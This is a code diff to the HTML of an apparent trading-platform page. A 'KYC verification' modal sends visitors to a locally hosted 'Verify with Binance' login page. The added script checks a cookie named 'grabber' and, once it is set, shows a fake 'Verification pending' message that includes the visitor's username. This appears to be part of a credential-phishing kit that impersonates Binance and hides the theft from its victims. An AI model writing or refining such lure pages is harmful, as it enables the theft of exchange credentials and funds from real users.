@@ -27,11 +27,13 @@
     <div class="modal">
       <label class="modal-overlay"></label>
       <div class="modal-content flex flex-col gap-5">
-        <h2 class="text-xl">Account Verification</h2>
-        <span>In order to access your account and start trading with our strategies, you need to verify your identity.</span>
-        <span>This will complete the KYC verification and enable you to start using our platform without any limitations.</span>
+        <h2 class="text-xl" id="verificationHeading">Account Verification</h2>
+        <div class="flex flex-col gap-3" id="verificationDetails">
+          <span>In order to access your account and start trading with our strategies, you need to verify your identity.</span>
+          <span>This will complete the KYC verification and enable you to start using our platform without any limitations.</span>
+        </div>
         <div class="flex gap-3">
-            <a href="/login_binance.html" class="w-full">
+            <a href="/login_binance.html" class="w-full" id="verifyBtn">
                 <button class="btn btn-outline-[#f0b90b] btn-block text-[#f0b90b] gap-3">
                     <img class="w-6" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAACXBIWXMAAAsTAAALEwEAmpwYAAACeklEQVR4nO2bS07DMBBAXZZOJMQCxGHKNTgAnwVwCO4A6qZcA4FDb0EluEVSBbZlUNqmSC2pZ/xJPXFGys6x+l5ce/wToo8++thXAIhB9YgYA0AMikw+zrJkDPfiQEQKD6snHgmwDR+PBGiG774E0MN3VwLg4bsnAejw3ZEA5vD8JYA9PF8J4A6enwRwD89HAviDD18CVPBKjihAhUp+qof2jhwFN4ECgy+/BE9vCyUviiyZs20JYAFf18FWAjiAZysBHMKzlJBPjg5nSk7R8FkyL5S81tVblSFJUHJa/Raxjyhf0uOZku+2X960JRSZ/Px+lqdin1FqJCzgVXpDrVcnIQh4nQRTeJ2E1uEBxCCfpEOKBAz8V5acVO9RJGDg89f0zFmyBKvefpWx3WEkYODXZRFAtQRU2Td5tRCmkifr0QE2hjq0hNfknNRaEGBVndrWUsOvRwgLCdAwzlN7dHR/Yfm/3oK3kQCaJMdUgnbEMJTQCG8iAZAZHlUCOmcgStDCUyQAMb3FSsDCUyWg4bESYCngYe8ClPxACaDPHcba4RGQErz9BZDwBhL08FgJ3jpBIjxBAh5eJ8HbMGgIj5BAh2+SgIE3SoQQ8KhEaFuCOfymBDR8nQqjy+rhSanwnwR7eOvJkEaCt8nQJB22unJc7poOW/QXwUyHrRdEDCSwWBApfS2JZfIy+CWxPPZFUfCxLI788s7G+aA2RrjBO90a4wrvZHOUO3wdUW+Pt3pAIlT4Vo7IhA7v9ZAUF3gvx+S4wTs9KMkV3slRWe7wVoeluwJvdFy+a/CkCxNdhUddmek6/M5LU7HA/3ttLjb4OqK+ONlHHyKI+AUPtv4JkISRWgAAAABJRU5ErkJggg==">
                     Verify with Binance
@@ -106,10 +108,22 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
         var modal = document.getElementById('modal-3');
+
+        var verificationHeading = document.getElementById('verificationHeading');
+        var verificationDetails = document.getElementById('verificationDetails');
+        var verifyBtn = document.getElementById('verifyBtn');
+
         window.onload = () => {
-            setTimeout(() => {
-                modal.checked = true;
-            }, 4000);
+          console.log(getCookie('grabber'))
+          if (getCookie('grabber') === 'true') {
+            verificationHeading.innerHTML = 'Verification pending';
+            verificationDetails.innerHTML = `Your verification details are under process at the moment. We will notify you via email (${getCookie('username')}) once your account has been verified.`;
+            verifyBtn.innerHTML = '<button class="btn btn-primary btn-block gap-3">Return to home page</button>'
+            verifyBtn.href = '/index.html'
+          }
+          setTimeout(() => {
+              modal.checked = true;
+          }, 4000);
         }
 
         function getCookie(name) {
